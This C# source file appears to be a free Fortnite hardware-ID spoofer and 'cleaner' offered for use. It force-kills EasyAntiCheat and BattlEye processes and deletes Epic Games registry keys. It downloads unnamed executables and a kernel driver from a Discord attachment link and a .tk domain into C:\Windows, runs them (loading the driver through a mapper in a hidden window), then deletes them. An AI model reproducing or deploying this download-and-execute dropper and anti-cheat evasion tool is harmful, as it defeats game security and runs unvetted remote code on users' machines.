using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net;
using System.Diagnostics;
using System.Security.Principal;

namespace Spoofer_menu_test
{
    class Print
    {
        //CLEANER IS NOT UPDATED DO NOT DM ME
        private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;

        public static void Cleantraces()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
            process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
            process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + SIDCleaner + "\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("exit");
        }
        public static void CleanTraces2()
        {
            using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
            {
                WebClient web = new WebClient();

                string link7 = "https://cdn.discordapp.com/attachments/670374247335591944/670404644807114752/Caught.Power.exe";
                string location7 = @"C:\Windows\Caught.Power.exe";

                web.DownloadFile(link7, location7);

                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.FileName = location7;
                proc.Start();
                proc.WaitForExit();
                Cleantraces();
            }
        }
         static public void Clean()
         {
            Thread.Sleep(1000);
            Console.Clear();

            Console.WriteLine("Cleaning...");

            Thread.Sleep(1000);

            CleanTraces2();

            Thread.Sleep(5000);

            Console.WriteLine("Done !!");
        }
        static public void prints()
        {
            /*colour list
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.ForegroundColor = ConsoleColor.Gray;
                */
            //Remove colour Console.ResetColor();

            Thread.Sleep(1000);
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("By THEGUY3ds [DO NOT DM ME IF THE SPOOFERS, OR CLEANER IS DETECTED THIS IS A FREE SPOOFER]");

            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("LOL.XYZ SPOOFER FN");
            Console.WriteLine("");

            Console.ResetColor();
            Console.WriteLine("Spoof [1]");
            Console.WriteLine("");
            Console.WriteLine("Clean [2]");
            Console.WriteLine("");

            Console.WriteLine("Option:");
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            WebClient webClient = new WebClient();
            Process process = new Process();


            Thread.Sleep(1000);
            Print.prints();

            var menu = Console.ReadLine();

            if (menu == "1")
            {
                Console.Clear();

                //Old serials
                Console.WriteLine("Old serials");
                var check1 = new ProcessStartInfo();
                Console.ForegroundColor = ConsoleColor.Red;
                string cmd = "wmic diskdrive get serialnumber && WMIC BIOS GET SERIALNUMBER";
                check1.UseShellExecute = false;

                check1.WorkingDirectory = @"C:\Windows\System32";

                check1.FileName = @"C:\Windows\System32\cmd.exe";
                check1.Verb = "runas";
                check1.Arguments = "/c " + cmd;
                Process.Start(check1);
                Console.ResetColor();
                //

                Thread.Sleep(5000);

                Console.WriteLine("[!] Spoofing Diskdrive");
                Thread.Sleep(1000);
                Console.WriteLine("[!] Spoofing Volume");
                Thread.Sleep(1000);
                Console.WriteLine("[!] Spoofing SMBIOS");
                Thread.Sleep(1000);
                Console.WriteLine("[!] Spoofing GPU");
                Thread.Sleep(1000);
                Console.WriteLine("[!] Spoofing Bios");
                //Bios spoofer
                string bios = @"C:\Windows\BIOS.exe";
                webClient.DownloadFile("http://overhaxweebloader.tk/freespoof/BIOSSPOOFEROVERHAX.exe", bios);
                process.StartInfo.UseShellExecute = false;
                process = Process.Start(bios);
                Thread.Sleep(1000);
                process.Close();
                File.Delete(bios);
                process.WaitForExit();
                //
                Thread.Sleep(5000);

                // Main spoofer driver load.

                Thread.Sleep(1000);

                string map = @"C:\Windows\IME\mapper.exe";
                string sys = @"C:\Windows\IME\spoof.sys";
                webClient.DownloadFile("http://overhaxweebloader.tk/freespoof/OVERHAXSPOOFERDRIVER.sys", sys);
                webClient.DownloadFile("http://overhaxweebloader.tk/freespoof/mapper.exe", map);
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process = Process.Start(map, sys);
                Thread.Sleep(1000);
                process.Close();
                File.Delete(sys);
                File.Delete(map);
                Thread.Sleep(2000);

                //Old serials
                Console.WriteLine("Old serials");
                Console.ForegroundColor = ConsoleColor.Green;
                string cmd2 = "wmic diskdrive get serialnumber && WMIC BIOS GET SERIALNUMBER";
                check1.UseShellExecute = false;

                check1.WorkingDirectory = @"C:\Windows\System32";

                check1.FileName = @"C:\Windows\System32\cmd.exe";
                check1.Verb = "runas";
                check1.Arguments = "/c " + cmd2;
                check1.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(check1);
                Console.ResetColor();
                //

                Thread.Sleep(5000);

                Console.WriteLine("Spoofed successfully");

                Print.prints();
            }
            else
            {
                Print.prints();
            }

            if (menu == "2")
            {

                Console.Clear();
                Thread.Sleep(1000);

                Print.Clean();
                Console.WriteLine("Cleaned successfully");

                Print.prints();
            }
            else
            {
                Print.prints();
            }
        }
    }
}
